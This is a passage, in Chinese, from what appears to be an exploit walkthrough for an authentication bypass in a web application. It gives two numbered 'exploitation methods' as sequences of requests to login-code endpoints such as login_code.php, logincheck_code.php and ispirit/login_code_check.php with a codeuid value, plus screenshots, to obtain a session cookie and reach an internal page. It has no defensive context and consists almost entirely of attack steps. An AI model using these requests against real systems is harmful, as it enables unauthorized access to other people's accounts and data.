...
`http://url/general/login_code.php`

![](images/15889197317516.png)

第二步：拿到cookie

`http://url/logincheck_code.php`

![](images/15889197516933.png)

第三步：

`http://url/general/index.php?is_modify_pwd=1`

![](images/15889197783529.png)

**第二种利用方法**

第一步：

`http://url/ispirit/login_code.php`

![](images/15889197991459.png)

第二步：

`http://url/general/login_code_scan.php`

![](images/15889198194697.png)


第三步：

`http://url/ispirit/login_code_check.php?codeuid={EED2B9FE-F865-DCF1-0E8D-3326AE163F6D}`

![](images/15889198430056.png)

第四步：

![](images/15889198501913.png)
